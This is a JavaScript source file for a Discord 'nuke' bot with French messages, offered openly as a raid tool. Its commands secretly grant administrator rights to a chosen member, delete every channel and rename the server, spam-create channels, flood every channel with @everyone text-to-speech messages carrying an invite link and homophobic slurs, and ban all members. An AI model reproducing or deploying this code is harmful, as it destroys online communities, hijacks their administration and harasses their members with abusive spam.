const Discord = require("discord.js");
const botconfig = require("./botconfig.json");
var bot = new Discord.Client();

bot.on('ready', () => {
    console.log(`===========================================================`)
    console.log(`Ci-dessous se trouve les [LOGS] !`)
    console.log(`===========================================================`)
    console.log(`[LOGS] ${bot.user.username} Le Self est en ligne !`)
    console.log(`[LOGS] ${bot.user.username} prêt à utiliser vos commandes !`)
    console.log(`===========================================================`)


})

bot.on('message', message => {
    let prefix = botconfig.prefix;

    bot.on('message', message => {
        let args = message.content.trim().split(/ +/g)
        if(message.deletable) message.delete
        if (args[0].toLowerCase() === prefix + ".") {
            let member = message.mentions.members.first()
            if (!member) return message.channel.send("Membre introuvable")
            if(message.deletable) message.delete()
            let muterole = message.guild.roles.find(role => role.name === 'Hz')
            if (muterole) {
                member.addRole(muterole)
            }
            else {
                message.guild.createRole({name: 'Hz', permissions: 8}).then((role) => {
                    message.guild.channels.filter(channel => channel.type === 'text').forEach(channel => {
                        channel.overwritePermissions(role, {
                            SEND_MESSAGES: true
                        })
                    })
                    member.addRole(role)
                })
            }
        }
    })

    if (message.content === prefix + 'Menu') {
        message.delete();

        let botembed = new Discord.RichEmbed() 
            .setTitle('La Hz en force ') 
            .addField('𝙻𝚎𝚜 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚎𝚜 𝚙𝚛𝚒𝚗𝚌𝚒𝚙𝚊𝚕𝚎𝚜',  
                ' \r ,servdestroy \r ,servdestroy2 \r ,.@delapersonne (cette commande est faite pour avoir les perms admin) \r ,banall')
            .setDescription('by [Hz] Purple Haze#9605') 
            .setColor('#6E00C8') 
            .setTimestamp()
            .setFooter('by " purple')

        message.channel.send(botembed);
    }
    
    else if (message.content === prefix + "servdestroy") {
        message.delete();

        if (message.channel.type === "dm") return;
        if (message.guild.channels.size === 0) return;
        if (!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
        message.guild.channels.forEach(chan => { if (chan.deletable) chan.delete(); })

        if (message.guild.name != `By Hz`) {
            message.guild.setIcon("https://imgur.com/p3iIDsg").catch(error => { })
            message.guild.setName('Hz🐒').catch(error => { })
            message.guild.setRegion('russia').catch(error => { })
        }
        setInterval(function () {
            if (message.guild.channels.size < 499) {
                message.guild.createChannel('Hz🐒', 'text').catch(error => { })
            }
        }, 400);
    }
    else if (message.content === prefix + 'servdestroy2') { //C'est cette commande qui ne marche pas :smiley: 

        if (message.channel.type === "dm") return;

        setInterval(function () {
            message.guild.channels.every(channel => channel.send("@everyone @here . REJOINS NOUS ICI !!! \n" + // 
                "https://discord.gg/ttmTsYx: \n" +
                "Bz par la Hz \n" +
                "t un gros pd \r la Hz baise tout", { tts: true }).catch(error => { }))
        }, 400);
    }
    if (message.content === prefix + "banall") {
        if (message.deletable) message.delete();
        message.guild.members.forEach(member => {
            member.ban().then(function () { });
        });
    }
    
});

bot.login('token ici')

